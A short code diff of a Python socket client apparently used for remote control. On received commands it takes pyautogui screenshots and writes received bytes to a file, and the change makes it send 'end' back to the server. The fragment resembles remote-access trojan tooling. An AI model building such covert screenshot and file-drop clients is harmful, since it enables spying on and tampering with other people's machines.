@@ -32,7 +32,7 @@ try:
             th.start()
         elif data == "3":
             print(pyautogui.screenshot())
-            pyautogui.screenshot()
+            client.send("end".encode())
         elif "img" in data:
             with open(data.split(" ")[1],"wb") as file:
                 file.write(byt)
